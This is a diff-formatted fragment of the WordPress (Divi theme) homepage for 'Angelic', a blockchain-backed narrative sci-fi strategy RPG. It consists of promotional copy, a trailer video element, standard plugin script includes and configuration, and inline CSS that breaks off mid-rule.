+				<div class="et_pb_module et_pb_text et_pb_text_0  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><p style="text-align: center;">Narrative Multiplayer Strategy RPG Enhanced by the Blockchain<br />and Set in a Collaborative Sci-Fi Universe</p></div>
+			</div>
+			</div>
+				
+				
+			</div><div class="et_pb_row et_pb_row_2">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_2  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_1 trailer et_pb_section_video et_pb_preload  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				<span class="et_pb_section_video_bg  ">
+					
+			<video loop="loop" autoplay playsinline muted >
+				<source type="video/mp4" src="wp-content/uploads/2021/11/SteamGif-2.mp4" />
+				
+			</video>
+				</span>
+				<div class="et_pb_text_inner"><p>&nbsp;</p></div>
+			</div>
+			</div>
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_section et_pb_section_2 et_pb_with_background et_section_regular" >
+				
+				
+				
+				
+					<div class="et_pb_row et_pb_row_3">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_3  et_pb_css_mix_blend_mode_passthrough et-last-child et_pb_column_empty">
+				
+				
+				
+			</div>
+				
+				
+			</div><div class="et_pb_row et_pb_row_4">
+				<div class="et_pb_column et_pb_column_4_4 et_pb_column_4  et_pb_css_mix_blend_mode_passthrough et-last-child">
+				
+				
+				<div class="et_pb_module et_pb_text et_pb_text_2  et_pb_text_align_left et_pb_bg_layout_light">
+				
+				
+				<div class="et_pb_text_inner"><h2 style="text-align: center;"><strong>Join the Ranks of the Angels!</strong></h2>
+<p style="text-align: center;">Angelic combines turn-based strategy combat with a narrative RPG, all backed by a collaboratively crafting science-fiction setting thanks to blockchain technology. Get ready to shape a massive conflict in the dark and compelling universe of Angelic.</p>
+<p style="text-align: center;">It will not be an easy journey, and each action will have deep echoing repercussions. But don&#8217;t worry, you won&#8217;t have to do it alone.</p></div>
+			</div><div class="et_pb_module et_pb_gallery et_pb_gallery_0  et_pb_bg_layout_light et_pb_slider et_pb_gallery_fullwidth">
+				<div class="et_pb_gallery_items et_post_gallery clearfix" data-per_page="4"><div class="et_pb_gallery_item et_pb_bg_layout_light et_pb_gallery_item_0_0">
+				<div class='et_pb_gallery_image landscape'> </div></div></div></div>
+			</div>
+				
+				
+			</div>
+</div>
+</div>
+	</div>
+						</div>
+
+				
+				</article>
+
+			
+
+</div>
+</div>
+
+			
+		</div>
+		</div>
+<script type="text/javascript">
+				var et_animation_data = [{"class":"et_pb_row_5","style":"fade","repeat":"once","duration":"800ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_gallery_1","style":"fade","repeat":"once","duration":"1000ms","delay":"250ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_row_6","style":"fade","repeat":"once","duration":"800ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_video_1","style":"fade","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_row_7","style":"fade","repeat":"once","duration":"800ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_gallery_2","style":"fade","repeat":"once","duration":"1000ms","delay":"250ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_row_8","style":"fade","repeat":"once","duration":"800ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_gallery_3","style":"fade","repeat":"once","duration":"1000ms","delay":"250ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"},{"class":"et_pb_signup_0","style":"fade","repeat":"once","duration":"1000ms","delay":"0ms","intensity":"50%","starting_opacity":"0%","speed_curve":"ease-in-out"}];
+				</script>
+	<link rel='stylesheet' id='mediaelement-css'  href='wp-includes/js/mediaelement/mediaelementplayer-legacy.min08e1.css?ver=4.2.16' type='text/css' media='all' />
+<link rel='stylesheet' id='wp-mediaelement-css'  href='wp-includes/js/mediaelement/wp-mediaelement.min7404.css?ver=5.9.3' type='text/css' media='all' />
+<script type='text/javascript' src='wp-includes/js/imagesloaded.mineda1.js?ver=4.1.4' id='imagesloaded-js'></script>
+<script type='text/javascript' src='wp-includes/js/masonry.min3a05.js?ver=4.2.2' id='masonry-js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery.masonry.minef70.js?ver=3.1.2b' id='jquery-masonry-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi-child/js/vanilla-tilt.min7404.js?ver=5.9.3' id='dp_tilt_scripts-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi-child/js/init-tilt7404.js?ver=5.9.3' id='init-tilt-js'></script>
+<script type='text/javascript' id='divi-custom-script-js-extra'>
+/* <![CDATA[ */
+var DIVI = {"item_count":"%d Item","items_count":"%d Items"};
+var et_builder_utils_params = {"condition":{"diviTheme":true,"extraTheme":false},"scrollLocations":["app","top"],"builderScrollLocations":{"desktop":"app","tablet":"app","phone":"app"},"onloadScrollLocation":"app","builderType":"fe"};
+var et_frontend_scripts = {"builderCssContainerPrefix":"#et-boc","builderCssLayoutPrefix":"#et-boc .et-l"};
+var et_pb_custom = {"ajaxurl":"https:\/\/angelicthegame.com\/wp-admin\/admin-ajax.php","images_uri":"https:\/\/angelicthegame.com\/wp-content\/themes\/Divi\/images","builder_images_uri":"https:\/\/angelicthegame.com\/wp-content\/themes\/Divi\/includes\/builder\/images","et_frontend_nonce":"c73a81b846","subscription_failed":"Please, check the fields below to make sure you entered the correct information.","et_ab_log_nonce":"040a3333eb","fill_message":"Please, fill in the following fields:","contact_error_message":"Please, fix the following errors:","invalid":"Invalid email","captcha":"Captcha","prev":"Prev","previous":"Previous","next":"Next","wrong_captcha":"You entered the wrong number in captcha.","wrong_checkbox":"Checkbox","ignore_waypoints":"yes","is_divi_theme_used":"1","widget_search_selector":".widget_search","ab_tests":[],"is_ab_testing_active":"","page_id":"22","unique_test_id":"","ab_bounce_rate":"5","is_cache_plugin_active":"no","is_shortcode_tracking":"","tinymce_uri":""};
+var et_pb_box_shadow_elements = [];
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/themes/Divi/js/scripts.min3940.js?ver=4.13.1' id='divi-custom-script-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.fitvids3940.js?ver=4.13.1' id='fitvids-js'></script>
+<script type='text/javascript' src='wp-includes/js/comment-reply.min7404.js?ver=5.9.3' id='comment-reply-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/jquery.mobile3940.js?ver=4.13.1' id='jquery-mobile-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/hashchange3940.js?ver=4.13.1' id='hashchange-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/magnific-popup3940.js?ver=4.13.1' id='magnific-popup-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/easypiechart3940.js?ver=4.13.1' id='easypiechart-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/salvattore3940.js?ver=4.13.1' id='salvattore-js'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/ui/core.min0028.js?ver=1.13.1' id='jquery-ui-core-js'></script>
+<script type='text/javascript' id='popup-maker-site-js-extra'>
+/* <![CDATA[ */
+var pum_vars = {"version":"1.16.4","pm_dir_url":"https:\/\/angelicthegame.com\/wp-content\/plugins\/popup-maker\/","ajaxurl":"https:\/\/angelicthegame.com\/wp-admin\/admin-ajax.php","restapi":"https:\/\/angelicthegame.com\/wp-json\/pum\/v1","rest_nonce":null,"default_theme":"2225","debug_mode":"","disable_tracking":"","home_url":"\/","message_position":"top","core_sub_forms_enabled":"1","popups":[],"analytics_route":"analytics","analytics_api":"https:\/\/angelicthegame.com\/wp-json\/pum\/v1"};
+var pum_sub_vars = {"ajaxurl":"https:\/\/angelicthegame.com\/wp-admin\/admin-ajax.php","message_position":"top"};
+var pum_popups = {"pum-2234":{"triggers":[{"type":"click_open","settings":{"cookie_name":"","extra_selectors":".trailer"}}],"cookies":[],"disable_on_mobile":false,"disable_on_tablet":false,"atc_promotion":null,"explain":null,"type_section":null,"theme_id":"2225","size":"medium","responsive_min_width":"0%","responsive_max_width":"100%","custom_width":"640px","custom_height_auto":false,"custom_height":"380px","scrollable_content":false,"animation_type":"fade","animation_speed":"350","animation_origin":"center top","open_sound":"none","custom_sound":"","location":"center top","position_top":"100","position_bottom":"0","position_left":"0","position_right":"0","position_from_trigger":false,"position_fixed":false,"overlay_disabled":false,"stackable":false,"disable_reposition":false,"zindex":"1999999999","close_button_delay":"0","fi_promotion":null,"close_on_form_submission":false,"close_on_form_submission_delay":"0","close_on_overlay_click":false,"close_on_esc_press":false,"close_on_f4_press":false,"disable_form_reopen":false,"disable_accessibility":false,"theme_slug":"default-theme","id":2234,"slug":"home-video"}};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/uploads/pum/pum-site-scripts626d.js?defer&amp;generated=1645722240&amp;ver=1.16.4' id='popup-maker-site-js'></script>
+<script type='text/javascript' src='wp-content/themes/Divi/core/admin/js/common3940.js?ver=4.13.1' id='et-core-common-js'></script>
+<script type='text/javascript' src='wp-content/plugins/wp-smushit/app/assets/js/smush-lazy-load.minc063.js?ver=3.9.5' id='smush-lazy-load-js'></script>
+<script type='text/javascript' id='smush-lazy-load-js-after'>
+function rw() { Waypoint.refreshAll(); } window.addEventListener( 'lazybeforeunveil', rw, false); window.addEventListener( 'lazyloaded', rw, false);
+</script>
+<script type='text/javascript' src='wp-content/plugins/post-and-page-builder/assets/js/jquery-stellar/jquery.stellarf51d.js?ver=1.16.0' id='boldgrid-parallax-js'></script>
+<script type='text/javascript' src='wp-content/plugins/post-and-page-builder/assets/dist/public.minf51d.js?ver=1.16.0' id='boldgrid-editor-public-js'></script>
+<script type='text/javascript' src='wp-content/plugins/post-and-page-builder-premium/dist/application.min97de.js?ver=1.0.5' id='bgpbpp-public-js'></script>
+<script type='text/javascript' id='mediaelement-core-js-before'>
+var mejsL10n = {"language":"en","strings":{"mejs.download-file":"Download File","mejs.install-flash":"You are using a browser that does not have Flash player enabled or installed. Please turn on your Flash player plugin or download the latest version from https:\/\/get.adobe.com\/flashplayer\/","mejs.fullscreen":"Fullscreen","mejs.play":"Play","mejs.pause":"Pause","mejs.time-slider":"Time Slider","mejs.time-help-text":"Use Left\/Right Arrow keys to advance one second, Up\/Down arrows to advance ten seconds.","mejs.live-broadcast":"Live Broadcast","mejs.volume-help-text":"Use Up\/Down Arrow keys to increase or decrease volume.","mejs.unmute":"Unmute","mejs.mute":"Mute","mejs.volume-slider":"Volume Slider","mejs.video-player":"Video Player","mejs.audio-player":"Audio Player","mejs.captions-subtitles":"Captions\/Subtitles","mejs.captions-chapters":"Chapters","mejs.none":"None","mejs.afrikaans":"Afrikaans","mejs.albanian":"Albanian","mejs.arabic":"Arabic","mejs.belarusian":"Belarusian","mejs.bulgarian":"Bulgarian","mejs.catalan":"Catalan","mejs.chinese":"Chinese","mejs.chinese-simplified":"Chinese (Simplified)","mejs.chinese-traditional":"Chinese (Traditional)","mejs.croatian":"Croatian","mejs.czech":"Czech","mejs.danish":"Danish","mejs.dutch":"Dutch","mejs.english":"English","mejs.estonian":"Estonian","mejs.filipino":"Filipino","mejs.finnish":"Finnish","mejs.french":"French","mejs.galician":"Galician","mejs.german":"German","mejs.greek":"Greek","mejs.haitian-creole":"Haitian Creole","mejs.hebrew":"Hebrew","mejs.hindi":"Hindi","mejs.hungarian":"Hungarian","mejs.icelandic":"Icelandic","mejs.indonesian":"Indonesian","mejs.irish":"Irish","mejs.italian":"Italian","mejs.japanese":"Japanese","mejs.korean":"Korean","mejs.latvian":"Latvian","mejs.lithuanian":"Lithuanian","mejs.macedonian":"Macedonian","mejs.malay":"Malay","mejs.maltese":"Maltese","mejs.norwegian":"Norwegian","mejs.persian":"Persian","mejs.polish":"Polish","mejs.portuguese":"Portuguese","mejs.romanian":"Romanian","mejs.russian":"Russian","mejs.serbian":"Serbian","mejs.slovak":"Slovak","mejs.slovenian":"Slovenian","mejs.spanish":"Spanish","mejs.swahili":"Swahili","mejs.swedish":"Swedish","mejs.tagalog":"Tagalog","mejs.thai":"Thai","mejs.turkish":"Turkish","mejs.ukrainian":"Ukrainian","mejs.vietnamese":"Vietnamese","mejs.welsh":"Welsh","mejs.yiddish":"Yiddish"}};
+</script>
+<script type='text/javascript' src='wp-includes/js/mediaelement/mediaelement-and-player.min08e1.js?ver=4.2.16' id='mediaelement-core-js'></script>
+<script type='text/javascript' src='wp-includes/js/mediaelement/mediaelement-migrate.min7404.js?ver=5.9.3' id='mediaelement-migrate-js'></script>
+<script type='text/javascript' id='mediaelement-js-extra'>
+/* <![CDATA[ */
+var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/","classPrefix":"mejs-","stretching":"responsive"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-includes/js/mediaelement/wp-mediaelement.min7404.js?ver=5.9.3' id='wp-mediaelement-js'></script>
+<script type='text/javascript' id='et-builder-modules-script-motion-js-extra'>
+/* <![CDATA[ */
+var et_pb_motion_elements = {"desktop":[],"tablet":[],"phone":[]};
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/motion-effects3940.js?ver=4.13.1' id='et-builder-modules-script-motion-js'></script>
+<script type='text/javascript' id='et-builder-modules-script-sticky-js-extra'>
+/* <![CDATA[ */
+var et_pb_sticky_elements = [];
+/* ]]> */
+</script>
+<script type='text/javascript' src='wp-content/themes/Divi/includes/builder/feature/dynamic-assets/assets/js/sticky-elements3940.js?ver=4.13.1' id='et-builder-modules-script-sticky-js'></script>
+<style id="et-builder-module-design-tb-1964-deferred-22-cached-inline-styles">.et_pb_section_0.et_pb_section{padding-top:5px;padding-bottom:5px;margin-top:0px;margin-bottom:0px;background-color:RGBA(0,0,0,0)!important}.et_pb_row_0{background-color:RGBA(0,0,0,0)}.et_pb_row_16,body #page-container .et-db #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,.et_pb_row_16,body .pum-container .et-db #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,.et_pb_row_16,body #page-container .et-db .pum .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,.et_pb_row_16,body .pum-container .et-db .pum .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_16.et_pb_row,.et_pb_row_2,body #page-container .et-db #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,.et_pb_row_2,body .pum-container .et-db #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,.et_pb_row_2,body #page-container .et-db .pum .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,.et_pb_row_2,body .pum-container .et-db .pum .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_2.et_pb_row,.et_pb_row_1,body #page-container .et-db #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,.et_pb_row_1,body .pum-container .et-db #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,.et_pb_row_1,body #page-container .et-db .pum .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,.et_pb_row_1,body .pum-container .et-db .pum .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_1.et_pb_row,.et_pb_row_0,body #page-container .et-db #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,.et_pb_row_0,body .pum-container .et-db #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,.et_pb_row_0,body #page-container .et-db .pum .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,.et_pb_row_0,body .pum-container .et-db .pum .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_0.et_pb_row,.et_pb_row_3,body #page-container .et-db #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,.et_pb_row_3,body .pum-container .et-db #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,.et_pb_row_3,body #page-container .et-db .pum .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,.et_pb_row_3,body .pum-container .et-db .pum .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_3.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_3.et_pb_row{width:100%;max-width:100%}.et_pb_video_0{padding-top:0px;padding-bottom:0px;margin-top:0px!important;margin-bottom:0px!important;width:100%;max-width:100%}.et_pb_video_0 .et_pb_video_overlay_hover:hover,.et_pb_video_1 .et_pb_video_overlay_hover:hover{background-color:rgba(0,0,0,.6)}div.et_pb_section.et_pb_section_1{background-image:linear-gradient(180deg,rgba(10,1,1,0.65) 0%,#0c0705 100%)!important}.et_pb_section_1.et_pb_section{padding-top:0px;padding-bottom:0px;background-color:#110f24!important}.et_pb_text_5.et_pb_text,.et_pb_text_4.et_pb_text,.et_pb_text_6.et_pb_text,.et_pb_text_3.et_pb_text,.et_pb_text_2.et_pb_text,.et_pb_text_7.et_pb_text,.et_pb_text_0.et_pb_text{color:#FFFFFF!important}.et_pb_text_0,.et_pb_text_6,.et_pb_text_4,.et_pb_text_3,.et_pb_text_5{font-size:18px}.et_pb_text_7 h2,.et_pb_text_6 h2,.et_pb_text_3 h2,.et_pb_text_4 h2,.et_pb_text_2 h2,.et_pb_text_0 h2,.et_pb_text_5 h2{font-size:30px;color:#FFFFFF!important;line-height:1.6em}.et_pb_row_2{background-size:contain;background-image:url(wp-content/uploads/2021/11/MG-e1637776165499.png),linear-gradient(180deg,rgba(43,135,218,0) 70%,#0b0604 88%)}.et_pb_row_2.et_pb_row{padding-top:475px!important;padding-bottom:60px!important;margin-right:auto!important;margin-bottom:-8px!important;margin-left:auto!important;padding-top:475px;padding-bottom:60px}.et_pb_text_1{height:200px}div.et_pb_section.et_pb_section_2{background-repeat:repeat-y;background-image:url(https://angelicthegame.com/wp-content/uploads/2021/11/background-highres-1.jpg)!important}.et_pb_section_2.et_pb_section{padding-top:0px;padding-bottom:0px;margin-top:0px;background-color:#110f24!important}.et_pb_row_3{background-image:linear-gradient(180deg,#0b0604 60%,rgba(0,0,0,0.07) 100%)}.et_pb_row_3.et_pb_row{padding-top:76px!important;padding-bottom:0px!important;margin-top:0px!important;margin-right:auto!important;margin-bottom:-2px!important;margin-left:auto!important;padding-top:76px;padding-bottom:0px}.et_pb_row_4.et_pb_row{padding-top:7px!important;margin-top:13px!important;margin-right:auto!important;margin-left:auto!important;padding-top:7px}.et_pb_row_4,body #page-container .et-db #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,.et_pb_row_4,body .pum-container .et-db #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,.et_pb_row_4,body #page-container .et-db .pum .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,.et_pb_row_4,body .pum-container .et-db .pum .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_4.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_4.et_pb_row{max-width:800px}.et_pb_text_2{font-size:18px;padding-top:5px!important}.et_pb_gallery_0{box-shadow:0px 17px 28px -6px rgba(81,81,124,0.61)}.et_pb_row_6,body #page-container .et-db #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,.et_pb_row_6,body .pum-container .et-db #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,.et_pb_row_6,body #page-container .et-db .pum .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,.et_pb_row_6,body .pum-container .et-db .pum .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_6.et_pb_row,.et_pb_row_5,body #page-container .et-db #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,.et_pb_row_5,body .pum-container .et-db #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,.et_pb_row_5,body #page-container .et-db .pum .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,.et_pb_row_5,body .pum-container .et-db .pum .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_5.et_pb_row,.et_pb_row_7,body #page-container .et-db #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,.et_pb_row_7,body .pum-container .et-db #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,.et_pb_row_7,body #page-container .et-db .pum .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,.et_pb_row_7,body .pum-container .et-db .pum .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_7.et_pb_row,.et_pb_row_8,body #page-container .et-db #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,.et_pb_row_8,body .pum-container .et-db #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,.et_pb_row_8,body #page-container .et-db .pum .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,.et_pb_row_8,body .pum-container .et-db .pum .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single #page-container #et-boc .et-l .et_pb_row_8.et_pb_row,body.et_pb_pagebuilder_layout.single.et_full_width_page #page-container #et-boc .et-l .et_pb_row_8.et_pb_row{max-width:75%}.et_pb_gallery_1.et_pb_gallery{height:340px;max-height:340px}.et_pb_gallery_1{max-width:600px;box-shadow:0px 17px 28px -6px rgba(81,81,124,0.61)}.et_pb_row_6.et_pb_row,.et_pb_row_7.et_pb_row{padding-top:100px!important;padding-top:100px}.et_pb_video_1{max-width:600px;box-shadow:3px -7px 66px -27px #8392ab}.et_pb_gallery_3.et_pb_gallery,.et_pb_gallery_2.et_pb_gallery{height:340px;min-height:340px;max-height:340px}.et_pb_gallery_2{max-width:600px;box-shadow:-4px -24px 44px -22px rgba(81,81,124,0.61)}.et_pb_row_8.et_pb_row{padding-top:100px!important;margin-right:auto!important;margin-bottom:15px!important;margin-left:auto!important;padding-top:100px}.et_pb_gallery_3{max-width:600px;box-shadow:20px -39px 22px -30px 